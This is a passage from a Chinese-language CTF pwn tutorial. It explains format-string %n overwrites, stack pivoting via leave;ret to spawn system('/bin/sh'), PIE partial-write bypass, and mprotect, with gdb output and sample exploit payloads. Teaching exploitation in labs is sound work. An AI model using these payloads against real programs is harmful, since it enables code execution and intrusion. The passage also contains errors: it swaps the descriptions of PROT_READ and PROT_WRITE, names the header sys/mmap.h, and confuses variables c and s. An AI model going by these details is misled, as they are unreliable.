    puts("modified b for a big number!");
  }
  return 0;
}
```

而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload

```
...[overwrite addr]....%[overwrite offset]$n
```

其中...表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤

- 确定覆盖地址
- 确定相对偏移
- 进行覆盖

---

#### 4.5 覆盖栈内存

- **确定覆盖地址**
  首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。

- **确定相对偏移**
  其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数。 这里我们通过之前的泄露栈变量数值的方法来进行操作。在 printf 处下断点，输入`%d%d`:

```gdb
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
────────────────────────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcd0c', 'l8']
8
0xffffcd0c│+0x00: 0x080484d7  →  <main+76> add esp, 0x10     ← $esp
0xffffcd10│+0x04: 0xffffcd28  →  "%d%d"
0xffffcd14│+0x08: 0xffffcd8c  →  0x00000315
0xffffcd18│+0x0c: 0x000000c2
0xffffcd1c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd20│+0x14: 0xffffcd4e  →  0xffff0000  →  0x00000000
0xffffcd24│+0x18: 0xffffce4c  →  0xffffd07a  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
0xffffcd28│+0x1c: "%d%d"     ← $eax

```

我们可以发现在 0xffffcd14 处存储着变量 s 的数值。继而，我们再确定格式化字符串`%d%d`的地址 0xffffcd28 相对于 `printf` 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 `printf` 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。

如果我们使用`[addr]%n`作为参数输入程序，那么程序就会将整型数字 4 写入地址为`[addr]`的地方。

- **确定相对偏移**
  这样，第 6 个参数处的值就是存储变量 `s` 的地址，我们便可以利用 `%n` 的特征来修改 `s` 的值。payload 如下

```
[addr of s]%012d%6$n
```

`addr of c` 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 `c` 的值为 16。

## 5. 栈迁移

### 5.1 原理

栈迁移主要用来解决栈溢出时, 可以溢出的空间大小不足的问题。

栈迁移的实现：

通过将 ebp 覆盖成我们构造的 fake_ebp ，然后利用 leave_ret 这个 gadget 将 esp 劫持到 fake_ebp 的地址上

leave_ret 相当于

```
mov esp, ebp
pop ebp
pop eip
```

利用条件:

1. 能设法泄露出 ebp 的地址
2. 至少能控制 ebp 和 ret

达成栈迁移后, 可以不受缓冲区长度限制地, 控制返回地址, 或构造栈空间.

### 5.2 利用

假设有一 32 位的程序, 现在我们可以控制 ebp 和 ret, ebp 地址已泄露, 缓冲区长度为 0x28, 我们可以发送 0x30 长度的数据，程序中存在 system 函数.  
我们需要设法执行`system("/bin/sh")`, 那么可以发送 payload 如下

```
payload = ('a'*4 + p32(sys_addr) + p32(0xdeadbeef) + p32(leak_ebp-0x28) + '/bin/sh\x00').ljust(0x28, '\x00')
payload += p32(leak_ebp-0x38) + p32(leave_ret)
```

上面 paylaod 中的`leak_ebp-0x38`的`0x38`是通过 gdb 调试计算得到的偏移量, `leak_ebp-0x38`恰好是`buf`字符串的起始地址, 而`leak_ebp-0x28`就是`/bin/sh`在栈中的地址  
通过溢出, 我们将`ebp`的值修改为了`leak_ebp-0x38`; `ret`地址修改为了`leave_ret`, 即 leave gadget 的地址。注意程序正常退出时，也有会执行`leave; ret`, 我们来看看第一次`leave; ret`栈中发生了什么:

1. `mov esp, ebp`:
   `ebp`的地址被移动到了`esp`中

2. `pop ebp`:
   此时栈顶的值为`leak_ebp-0x38`, `pop ebp`后, `ebp`指向`leak_ebp-0x38`, 而执行 pop 后`esp`会加 4

3. `pop eip`:
   此时栈顶的值为`p32(leave_ret)`, 即下一条指令为被我们控制的`leave_ret`地址
   红色箭头所指地址是执行 leave 之后的对应的 ebp 和 esp
   ![](/CTF/vx_images/3268109150846.png)

我们来看看跳转到`leave_ret`后, 程序做了哪些事情:

1. `mov esp, ebp`:
   `ebp`的地址被移动到了`esp`中, 注意此时`ebp`指向的是`leak_ebp-0x38`, 所以`esp`也指向`leak_ebp-0x38`

2. `pop ebp`:
   ebp 指向栈顶的地址, 这个地址是什么已经不重要了, 但是`esp`会加 4, 指向`leak_ebp-0x34`

3. `pop eip`
   将栈顶的值给`eip`, 此时栈顶`esp`的值是`leak_ebp-0x34`, 这个值刚好是缓冲区第 4 个字节开始的位置. 即跳转到`p32(sys_addr)`, 此时的栈就像这样:

```
system address
0xdeadbeef
bin_sh_addr
/bin
/sh\x00
```

所以我们执行了`system("/bin/sh")`

## 6. PIE 绕过

### 6.1 PIE 简介

由于受到堆栈和 libc 地址可预测的困扰，ASLR 被设计出来并得到广泛应用。因为 ASLR 技术的出现，攻击者在 ROP 或者向进程中写数据时不得不先进行 leak，或者干脆放弃堆栈，转向 bss 或者其他地址固定的内存块。

而 PIE(position-independent executable, 地址无关可执行文件)技术就是一个针对代码段.text, 数据段.\*data，.bss 等固定地址的一个防护技术。同 ASLR 一样，应用了 PIE 的程序会在每次加载时都变换加载基址，从而使位于程序本身的 gadget 也失效。
![](/CTF/vx_images/5262705090967.png)
使用 PIE 保护时, 地址段加载地址将被随机化, IDA Pro 只能看地址段的后三位. 显然，PIE 的应用给 ROP 技术造成了很大的影响。但是由于某些系统和缺陷，其他漏洞的存在和地址随机化本身的问题，我们仍然有一些可以 bypass PIE 的手段。

### 6.2 partial write bypass PIE

partial write(部分写入)就是一种利用了 PIE 技术缺陷的 bypass 技术。由于内存的页载入机制，PIE 的随机化只能影响到单个内存页。通常来说，一个内存页大小为 0x1000，这就意味着不管地址怎么变，某条指令的后 12 位，3 个十六进制数的地址是始终不变的。因此我们只要爆破第四位的十六进制即可, 范围在 0x0~0xf, 大小可以接受. 因此我们在修改 ret 地址时, 只需要写入地址 16 进制的后 4 位进行爆破尝试. 但是此时只能进行无参函数的跳转, 存在一定的局限性.

---

## 7. mprotect 修改内存属性

### 7.1 原理

在 Linux 中，mprotect()函数可以用来修改一段指定内存区域的保护属性。
函数原型如下：

```c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);
```

mprotect()函数把自 start 开始的、长度为 len 的内存区的保护属性修改为 prot 指定的值。

prot 可以取以下几个值，并且可以用“|”将几个属性合起来使用：

1）PROT_READ：表示内存段内的内容可写；

2）PROT_WRITE：表示内存段内的内容可读；

3）PROT_EXEC：表示内存段中的内容可执行；

4）PROT_NONE：表示内存段中的内容根本没法访问。

需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。
